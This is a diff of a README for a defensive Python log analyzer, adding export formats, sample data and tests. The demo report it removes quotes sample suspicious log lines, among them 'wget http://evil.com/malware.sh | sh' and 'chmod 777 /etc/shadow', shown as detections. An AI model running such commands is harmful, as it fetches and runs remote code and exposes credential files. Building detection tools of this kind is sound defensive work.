@@ -11,7 +11,8 @@ A simple log parser and analyzer designed to detect suspicious security patterns
 - **Brute force detection** - Flags IPs with excessive failed login attempts
 - **Privilege escalation monitoring** - Detects sudo, su, and Windows privilege events
 - **Suspicious pattern matching** - Identifies dangerous commands and attack patterns
-- **Summary reports** - Generates readable security reports
+- **Multiple output formats** - Text (colored), JSON, and CSV
+- **Sample data included** - Ready to test out of the box
 
 ## Supported Log Formats
 
@@ -27,7 +28,6 @@ A simple log parser and analyzer designed to detect suspicious security patterns
 No external dependencies required. Uses Python standard library only.
 
 ```bash
-# Clone the repository
 git clone https://github.com/brushi/log-analyzer.git
 cd log-analyzer
 ```
@@ -40,16 +40,28 @@ cd log-analyzer
 python log_analyzer.py /var/log/auth.log
 ```
 
-### Save report to file
-
-```bash
-python log_analyzer.py /var/log/auth.log --output report.txt
-```
-
 ### Run demo mode
 
 ```bash
 python log_analyzer.py --demo
+```
+
+### Export as JSON
+
+```bash
+python log_analyzer.py auth.log --format json --output report.json
+```
+
+### Export as CSV
+
+```bash
+python log_analyzer.py auth.log --format csv --output report.csv
+```
+
+### Use sample data
+
+```bash
+python log_analyzer.py sample_auth.log
 ```
 
 ### Custom brute force threshold
@@ -58,58 +70,25 @@ python log_analyzer.py --demo
 python log_analyzer.py auth.log --threshold 3
 ```
 
-## Demo Output
-
-```
-============================================================
-  LOG ANALYSIS SECURITY REPORT
-  Generated: 2026-05-22 22:48:00
-============================================================
-
-[SUMMARY]
-  Total lines analyzed:    27
-  Failed login attempts:   20
-  Successful logins:       2
-  Privilege escalations:   2
-  Suspicious events:       2
-
-[!] BRUTE FORCE DETECTED
-  IPs with 5+ failed attempts:
-    - 192.168.1.100: 10 attempts
-    - 203.0.113.42: 7 attempts
-
-[TOP FAILED LOGIN SOURCES]
-         192.168.1.100: 10 attempts
-          203.0.113.42: 7 attempts
-             10.0.0.50: 3 attempts
-
-[TOP SUCCESSFUL LOGIN SOURCES]
-             172.16.0.5: 1 logins
-              10.0.0.1: 1 logins
-
-[PRIVILEGE ESCALATION EVENTS]
-  > Jan 15 08:30:00 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
-  > Jan 15 09:00:00 server sudo: deploy : TTY=pts/1 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
-
-[SUSPICIOUS EVENTS]
-  [Overly permissive file permissions]
-    Jan 15 08:35:00 server kernel: chmod 777 /etc/shadow attempted by user admin
-  [Download and execute pattern]
-    Jan 15 08:40:00 server bash[5678]: wget http://evil.com/malware.sh | sh
-
-============================================================
-  END OF REPORT
-============================================================
-```
-
 ## Project Structure
 
 ```
 log-analyzer/
-├── log_analyzer.py    # Main script
-├── README.md          # Documentation
-├── requirements.txt   # Dependencies (none)
-└── LICENSE            # MIT License
+├── log_analyzer.py      # Main script
+├── sample_auth.log      # Sample log data for testing
+├── tests/
+│   └── test_log_analyzer.py  # Unit tests
+├── pyproject.toml       # Package configuration
+├── README.md            # Documentation
+├── requirements.txt     # Dependencies (none)
+└── LICENSE              # MIT License
+```
+
+## Running Tests
+
+```bash
+pip install pytest
+pytest tests/
 ```
 
 ## License
